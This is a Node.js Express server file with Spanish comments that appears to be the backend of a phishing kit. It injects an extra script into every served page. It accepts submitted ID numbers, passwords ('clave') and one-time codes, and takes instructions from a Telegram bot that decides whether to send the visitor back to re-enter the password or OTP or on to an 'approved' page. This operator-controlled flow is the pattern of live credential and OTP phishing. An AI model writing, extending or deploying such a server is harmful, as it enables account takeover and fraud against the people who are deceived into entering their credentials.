const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para inyectar scripts en HTML sin modificar los archivos originales
app.use((req, res, next) => {
  const originalSend = res.send;

  res.send = function(data) {
    if (typeof data === 'string' && data.includes('</body>')) {
      // Inyectar scripts antes del cierre de body
      const scriptInyectado = data.replace(
        '</body>',
        `<script src="integration.js"><\/script>\n  </body>`
      );
      return originalSend.call(this, scriptInyectado);
    }
    return originalSend.call(this, data);
  };

  next();
});

app.use(express.static('.'));
app.use(express.json());

// ===== AUTO-PING =====
// Auto-ping para mantener activo en Render
setInterval(() => {
  console.log('✅ Auto-ping - Servidor activo:', new Date().toLocaleTimeString());
}, 30000);

// ===== RUTAS DE SALUD =====
// Ruta para verificar que el servidor está activo
app.get('/health', (req, res) => {
  res.json({
    status: 'Server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ===== RUTAS DE ESTADO =====
// Obtener estado actual de la sesión
app.get('/api/estado', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString()
  });
});

// ===== RUTAS DE VALIDACIÓN =====
// Procesar validaciones desde Telegram o frontend
app.post('/api/validate', (req, res) => {
  const { tipo, documento, clave, otp, flujo } = req.body;

  console.log(`📝 Validación ${tipo}:`, { documento, flujo, timestamp: new Date().toISOString() });

  // Validación básica
  const validaciones = {
    'error': {
      success: false,
      redirect: 'index.html',
      message: 'Información incorrecta'
    },
    'aprobado': {
      success: true,
      redirect: 'aprobado.html',
      message: 'Verificación completada'
    },
    'otp-error': {
      success: false,
      redirect: 'otp.html',
      message: 'Código OTP incorrecto'
    }
  };

  const resultado = validaciones[tipo] || { success: false, message: 'Tipo de validación no reconocido' };
  res.json(resultado);
});

// ===== RUTAS DE INTEGRACIÓN TELEGRAM =====
// Recibir acciones desde bot de Telegram
app.post('/api/telegram/accion', (req, res) => {
  const { usuario_id, accion, flujo, documento } = req.body;

  console.log(`🤖 Acción desde Telegram:`, { usuario_id, accion, flujo, documento });

  const respuesta = {
    success: true,
    usuario_id,
    accion,
    timestamp: new Date().toISOString()
  };

  res.json(respuesta);
});

// ===== RUTAS ESTÁTICAS =====
// Servir archivos HTML principales
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== MANEJO DE ERRORES =====
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    error: 'Error interno del servidor',
    message: err.message
  });
});

// ===== INICIO DEL SERVIDOR =====
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
  console.log(`🌍 Acceso remoto: http://0.0.0.0:${PORT}`);
  console.log('⏰ Auto-ping activado cada 30 segundos');
  console.log('\n📝 Rutas disponibles:');
  console.log('   GET  /health - Verificar estado del servidor');
  console.log('   GET  /api/estado - Obtener estado actual');
  console.log('   POST /api/validate - Validar datos');
  console.log('   POST /api/telegram/accion - Recibir acciones de Telegram');
});
